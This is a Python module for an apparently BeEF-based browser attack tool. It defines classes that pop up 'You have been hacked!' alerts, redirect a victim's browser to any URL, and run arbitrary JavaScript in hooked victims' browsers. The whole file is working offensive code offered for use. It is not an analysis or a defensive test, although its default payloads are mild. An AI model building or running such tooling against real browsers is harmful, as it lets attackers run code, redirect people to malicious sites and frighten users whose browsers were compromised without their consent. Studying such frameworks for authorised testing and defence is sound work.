#!/usr/bin/env python3
"""
Basic Attacks
Simple attacks like alerts, redirects, JavaScript injection
"""
from .base_attack import BaseAttack

class AlertAttack(BaseAttack):
    """Display alert dialog"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Alert Dialog"
        self.description = "Display a JavaScript alert box"
        self.module_id = 285
        self.category = "basic"
        self.execution_time = 2
        self.silent = False
        
    def get_params(self, **kwargs):
        text = kwargs.get('text', 'You have been hacked!')
        return {'text': text}

class Alert2Attack(BaseAttack):
    """Alternative alert dialog"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Alert Dialog (Alt)"
        self.description = "Display alternative alert dialog"
        self.module_id = 40
        self.category = "basic"
        self.execution_time = 2
        self.silent = False
        
    def get_params(self, **kwargs):
        text = kwargs.get('text', 'Your system has been compromised!')
        return {'question': text}

class RedirectAttack(BaseAttack):
    """Redirect browser to different URL"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Redirect Browser"
        self.description = "Redirect victim's browser to specified URL"
        self.module_id = 260
        self.category = "basic"
        self.execution_time = 1
        self.silent = False
        
    def get_params(self, **kwargs):
        url = kwargs.get('url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        return {'redirect_url': url}

class RawJavaScriptAttack(BaseAttack):
    """Execute raw JavaScript code"""
    
    def __init__(self, beef_api):
        super().__init__(beef_api)
        self.name = "Raw JavaScript"
        self.description = "Execute arbitrary JavaScript code in victim's browser"
        self.module_id = 80
        self.category = "basic"
        self.execution_time = 2
        
    def get_params(self, **kwargs):
        code = kwargs.get('code', 'alert("Hacked!")')
        return {'cmd': code}
